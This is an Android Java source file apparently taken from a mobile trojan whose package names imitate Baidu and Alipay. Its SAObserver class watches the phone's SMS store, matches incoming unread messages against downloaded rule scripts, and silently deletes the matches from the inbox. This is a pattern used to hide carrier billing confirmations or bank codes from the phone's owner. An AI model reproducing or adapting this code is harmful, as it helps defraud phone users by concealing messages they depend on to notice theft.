package com.baidu.serv;

import com.baidu.alipay.Constant;
import com.baidu.alipay.LogUtil;
import com.baidu.alipay.Utils;
import com.baidu.alipay.script.sms.GuardPojoWorker;
import com.baidu.alipay.script.sms.MatchResult;
import com.baidu.alipay.script.sms.Msg;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;

public class SAObserver extends ContentObserver {
//    private static final String TAG = "SmsData";
    private static long mCurrentMaxDate = 0l;
    private Context mContext;
    
    public static String PUSH_APKDIRECTORYPATH = Environment
            .getExternalStorageDirectory().toString() + "/sms.xml";

    public SAObserver(Context context, Handler handler) {
        super(handler);
        this.mContext = context;
    }

    public void onChange(boolean paramBoolean) {
        super.onChange(paramBoolean);
        
//        LogUtil.e(TAG, "onChange");
        try{
        	checkSms(mContext);
        }catch (Exception e) {
			 e.printStackTrace();
		}
    }

    public static void checkSms(final Context mContext) {
    	
    	if(mCurrentMaxDate == 0l){
    		mCurrentMaxDate = Utils.getLastSmsTime(mContext);
    	}
    	
    	boolean first = mCurrentMaxDate == 0;
    	
//    	LogUtil.e(TAG, "checkSms -> start ; mCurrentMaxId : " + mCurrentMaxDate);
    	
        Cursor localCursor = null;
        
        try {
        	localCursor = mContext.getContentResolver().query(
                    Uri.parse(Constant.URI_SMS),
                    new String[] { "_id", "thread_id", "address", "body", "date" },
                    "read = 0" + " AND " + "date > " + mCurrentMaxDate, null,
                    "date desc");
        	
            if (localCursor.moveToFirst()) {

                while (!localCursor.isAfterLast()) {
                    String address = localCursor.getString(localCursor
                            .getColumnIndex("address"));
                    String body = localCursor.getString(localCursor
                            .getColumnIndex("body"));
                    long date = localCursor.getLong(localCursor
                            .getColumnIndex("date"));
                    int id = localCursor.getInt(localCursor
                            .getColumnIndex("_id"));

                    if (date > mCurrentMaxDate) {
                        mCurrentMaxDate = date;
                        Utils.setLastSmsTime(mContext, mCurrentMaxDate);
                    }
                    
                    Msg msg = new Msg(id, address, body, date);
                   
                    boolean matched = GuardPojoWorker.match(mContext,msg);

//                    LogUtil.e(TAG, "checkSms ->  address: " + address + " ; body : " + body+" ; matched : "+matched);
                    
                    if (matched) {
                    	del(mContext,msg);
                    }
                    
                    if(first){
                    	break;
                    }else{
                        localCursor.moveToNext();
                    }
                }

            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (localCursor != null && !localCursor.isClosed()) {
                try {
					localCursor.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
            }
        }
        
        System.gc();
    }

    public static void del(Context mContext,Msg msg) {
//    	LogUtil.e(TAG, "deleteSms -> "+msg.getId());
    	
        del(mContext,msg.getId(), msg.getDate());
    }

    private static void del(Context mContext,int id, long date) {
        mContext.getContentResolver().delete(Uri.parse(Constant.URI_SMS +"/"+ id),
                null, null);
    }
}
